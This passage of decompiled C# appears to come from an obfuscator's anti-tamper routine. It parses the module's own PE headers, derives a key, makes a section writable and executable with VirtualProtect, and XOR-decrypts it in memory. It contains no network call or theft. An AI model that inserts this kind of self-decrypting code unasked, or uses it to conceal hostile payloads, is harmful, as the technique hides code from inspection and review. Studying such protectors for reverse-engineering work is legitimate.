		bool flag = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
		byte* ptr = (byte*)(void*)Marshal.GetHINSTANCE(module);
		byte* intPtr = ptr + (uint)(*(int*)(ptr + 60));
		ushort num = *(ushort*)(intPtr + 6);
		ushort num2 = *(ushort*)(intPtr + 20);
		uint* ptr2 = null;
		uint num3 = 0u;
		uint* ptr3 = (uint*)(intPtr + 24 + (int)num2);
		uint num4 = 795805111u;
		uint num5 = 373767920u;
		uint num6 = 3319004438u;
		uint num7 = 3568335541u;
		for (int i = 0; i < num; i++)
		{
			switch (*(ptr3++) * *(ptr3++))
			{
			default:
			{
				uint* ptr4 = (uint*)(ptr + (flag ? ptr3[3] : ptr3[1]));
				uint num8 = ptr3[2] >> 2;
				for (uint num9 = 0u; num9 < num8; num9++)
				{
					uint num10 = (num4 ^ *(ptr4++)) + num5 + num6 * num7;
					num4 = num5;
					num5 = num6;
					num5 = num7;
					num7 = num10;
				}
				break;
			}
			case 4093597973u:
				ptr2 = (uint*)(ptr + (flag ? ptr3[3] : ptr3[1]));
				num3 = (flag ? ptr3[2] : (*ptr3)) >> 2;
				break;
			case 0u:
				break;
			}
			ptr3 += 8;
		}
		uint[] array = new uint[16];
		uint[] array2 = new uint[16];
		for (int j = 0; j < 16; j++)
		{
			array[j] = num7;
			array2[j] = num5;
			num4 = (num5 >> 5) | (num5 << 27);
			num5 = (num6 >> 3) | (num6 << 29);
			num6 = (num7 >> 7) | (num7 << 25);
			num7 = (num4 >> 11) | (num4 << 21);
		}
		array[0] = array[0] ^ array2[0];
		array[1] = array[1] * array2[1];
		array[2] = array[2] + array2[2];
		array[3] = array[3] ^ array2[3];
		array[4] = array[4] * array2[4];
		array[5] = array[5] + array2[5];
		array[6] = array[6] ^ array2[6];
		array[7] = array[7] * array2[7];
		array[8] = array[8] + array2[8];
		array[9] = array[9] ^ array2[9];
		array[10] = array[10] * array2[10];
		array[11] = array[11] + array2[11];
		array[12] = array[12] ^ array2[12];
		array[13] = array[13] * array2[13];
		array[14] = array[14] + array2[14];
		array[15] = array[15] ^ array2[15];
		uint lpflOldProtect = 64u;
		VirtualProtect_1((IntPtr)ptr2, num3 << 2, 64u, out lpflOldProtect);
		if (lpflOldProtect != 64)
		{
			uint num11 = 0u;
			for (uint num12 = 0u; num12 < num3; num12++)
			{
				*ptr2 ^= array[num11 & 0xF];
				array[num11 & 0xF] = (array[num11 & 0xF] ^ *(ptr2++)) + 1035675673;
				num11++;
			}
		}
	}
}
